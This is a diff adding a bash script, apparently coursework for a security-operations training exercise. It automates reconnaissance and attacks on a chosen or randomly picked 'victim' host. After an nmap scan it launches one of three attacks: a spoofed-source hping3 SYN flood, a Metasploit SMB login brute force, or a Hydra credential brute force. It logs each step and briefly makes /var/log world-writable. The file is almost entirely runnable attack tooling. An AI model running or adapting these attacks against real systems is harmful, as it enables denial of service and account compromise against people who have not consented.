@@ -1,0 +1,216 @@
+#!/bin/bash
+
+#Writer: Ahmad Shamil
+#Created: .MAY.2023
+#Detail: This script mainly consist of two things, attacks method and script logs.
+#Purpose: To automate an attack on victim's machine.
+
+#Attack functions --------------------------------------------------------------------------------------------------------------------------------
+
+function doss()
+{
+	echo -en '\n[?] Proceed with attack? [y/n] - ' && read DA
+	
+	if [ $DA == y ]
+		then
+			echo -e '\n[?] State your target:'
+			echo -n '[*] Attacking via port : ' && read port
+			echo -n '[*] Number of packets sending : ' && read packet
+			echo -n '[*] Data size (max 65495) : ' && read size
+			echo -n '[*] Spoof your IP : ' && read spoofip
+			
+			echo "[!] $sgtime : Commencing Denial of Service attack on $victimip" >> /var/log/socpro.log
+			sudo hping3 -S $victimip -p $port -c $packet -d $size -a $spoofip 
+		
+		else 
+			echo -e '\n[!] Exiting! Good Bye!'
+			echo "[!] $sgtime : User $user ended script and exited" >> /var/log/socpro.log
+	fi
+}
+
+function smblogin()
+{
+	echo -en '\n[?] Proceed with attack? [y/n] - ' && read smb
+	
+	if [ $smb == y ]
+		then
+			echo -e '\n[!] Setting up msfconsole resource file:'
+			echo -n "[?] State victim's SMB domain - " && read domain
+			echo -n '[?] Save Hydra result as - ' && read smbres
+			
+			echo 'use auxiliary/scanner/smb/smb_login' > smb.rc
+			echo "set RHOSTS $victimip" >> smb.rc
+			echo "set SMBDomain $domain" >> smb.rc
+			echo 'set PASS_FILE pass.txt' >> smb.rc
+			echo 'set USER_FILE user.txt' >> smb.rc
+			echo 'run' >> smb.rc
+			echo 'exit' >> smb.rc
+			
+			echo "[!] $sgtime : Commencing Msfconsole - Brute force SMB Login attack on $victimip" >> /var/log/socpro.log
+			msfconsole -qr smb.rc -o $smbres.txt
+			
+			echo -e '\n[!] Result from the attack :'
+			cat $smbres.txt | grep Success
+
+		else
+			echo -e '\n[!] Exiting! Good Bye!'
+			echo "[!] $sgtime : User $user ended script and exited" >> /var/log/socpro.log
+	fi
+}
+
+function hydramultiup()
+{
+	echo -en '\n[?] Proceed with attack? [y/n] - ' && read hidra
+	
+	if [ $hidra == y ]
+		then
+			echo -en '\n[?] Specify the service type that you are attacking - ' && read svc
+			echo -n '[?] Save Hydra result as - ' && read hyres
+
+			echo "[!] $sgtime : Commencing hydra on $victimip $svc" >> /var/log/socpro.log
+			hydra -L user.txt -P pass.txt $victimip $svc -vV -o $hyres.txt
+			
+			echo -e '\n[!] Hydra attack result(no result means no match) :'
+			cat $hyres.txt | tail -n 1
+			
+		else
+				echo -e '\n[!] Exiting! Good Bye!'
+				echo "[!] $sgtime : User $user ended script and exited" >> /var/log/socpro.log
+	fi
+}
+
+#Script Head --------------------------------------------------------------------------------------------------------------------------------------------------------
+
+figlet @irtag
+
+echo -e '\n[!] Preparing script..'
+sudo chmod 777 /var/log
+socpro=$(locate socpro.log)
+sgtime=$(TZ=Asia/Singapore date)
+user=$(whoami)
+hostip=$(ifconfig | grep broadcast | awk '{print $2}')
+if [ -z $socpro ]
+	then	
+		echo "[!] $sgtime : Log created" > /var/log/socpro.log
+	else
+		echo "[!] $sgtime : User $user execute script, begin logging" >> /var/log/socpro.log
+fi
+sleep 3
+
+#Type of scan used for reconnaissance(phase 1) ***********************************************************************
+
+figlet phase1
+echo -en '\n[?] Execute scanning for available network? [y/n] - ' && read option
+
+if [ $option == y ]
+	then
+		echo -e '\n[!] Fill in the following details :'
+		echo -n "[?] Target's IP address - " && read IP
+		echo ''
+		sudo nmap $IP -sV -Pn -sS -oG nmap.scan
+		echo "[!] $sgtime : User $user performed Nmap scan on IP address: $IP" >> /var/log/socpro.log
+	else
+		echo "[!] $sgtime : User $user did not performed Nmap scan" >> /var/log/socpro.log
+		echo -e '\n[!] Re-scan if result below more than 12 hours'			
+fi
+sleep 3
+
+#choosing target(phase 2)*********************************************************************************************************
+
+figlet phase2
+
+echo -e '\n[!] List of potential victims :'
+cat nmap.scan | grep Ports | awk '{print $2}' | grep -v $hostip > iplist.txt
+cat iplist.txt
+echo -en '\n[?] Select your prefered victim? [y/n] - ' && read iwant
+
+if [ $iwant == y ]
+	then
+		echo -n "[?] Key in your victim's IP - " && read victimip
+		echo "[!] $sgtime : User $user have selected target. Target IP: $victimip" >> /var/log/socpro.log
+	else
+		ipcount=$(cat iplist.txt | wc -l)
+		random=$(echo $(( $RANDOM%$ipcount+1)))
+		victimip=$(cat iplist.txt | head -n $random | tail -n1)
+		echo -n "[!] Here is your victim's IP - $victimip" 
+		echo''
+		echo "[!] $sgtime : User $user have selected target. Target IP: $victimip" >> /var/log/socpro.log 
+fi
+sleep 3
+
+#Choice of attacks (phase 3)********************************************************************************************************
+
+figlet phase3
+echo -e '\n[!] Possible ways of attack: '
+echo '1) Denial of Service [DOS]'
+echo '2) Msfconsole - Brute force SMB Login'
+echo '3) Hydra - Brute force multiple service type'
+
+echo -en '\n[?] Select your prefered attack? [y/n] - ' && read ichoose
+
+if [ $ichoose == y ]
+	then
+		echo -e '\n[?] Enter mode(number) of attack - ' && read mode
+	else
+		mode=$(echo $(($RANDOM%3+1)))
+		echo -n "[!] Your attack mode - $mode"
+fi
+sleep 3
+
+#Commencing attack (phase 4)**************************************************************************************************************
+
+figlet phase4
+case $mode in
+	1)
+		echo "[!] $sgtime : $user selected Denial of Service attack" >> /var/log/socpro.log
+		
+		echo -e '\n[!] Attack method : Denial of service[DOS].'
+		echo '[!] Purpose of attack : To shut down a machine or network making the service inaccessible to its intended users.'
+		echo '[!] Effects of attack : Loss or degradation of critical services, loss of productivity, extensive remediation costs, and acute reputational damage.' 
+		echo '[!] Tool used : hping3'
+		echo '[!] Execution of attack : Will end when all packets are send'
+		
+		sleep 3
+		doss
+		;;
+		
+	2)
+		echo "[!] $sgtime : $user selected Msfconsole - Brute force SMB Login" >> /var/log/socpro.log
+			
+		echo -e '\n[!] Attack method : Brute force SMB Login.'
+		echo '[!] Purpose of attack : To brute force into the victim computer account through SMB login.'
+		echo '[!] Effects of attack : Compromising available accounts credentials' 
+		echo '[!] Tool used : Msfconsole'
+		echo '[!] Execution of attack : Trial and error of provided credentials'
+		echo '[!] Credential used : Default credentials for this tool, go to user/pass.txt to append'
+			
+		sleep 3
+		smblogin
+		;;
+			
+	3)
+		echo "[!] $sgtime : $user selected Hydra - Brute force multiple service type" >> /var/log/socpro.log
+					
+		echo -e '\n[!] Attack method : Brute force choice of services.'
+		echo '[!] Purpose of attack : To brute force into the victim computer account through open services.'
+		echo '[!] Effects of attack : Compromising available accounts credentials' 
+		echo '[!] Tool used : Hydra'
+		echo '[!] Execution of attack : Trial and error of provided credentials'
+		echo '[!] Credential used : Default credentials for this tool, go to user/pass.txt to append'
+					
+		sleep 3
+		hydramultiup
+		;;
+		
+	 *)
+		echo -e '\n[!] Incorrect response! Good Bye!'
+		echo "[!] $sgtime : Force exit due to incorrect response" >> /var/log/socpro.log			
+
+esac
+
+#Script Foot-----------------------------------------------------------------------------------------------------------------------------------------------
+
+cd 
+sudo chmod 755 /var/log
+echo -e '\n[!] Attack completed exiting script. Good Bye!'
+echo "[!] $sgtime : Attack complete, exit script!" >> /var/log/socpro.log
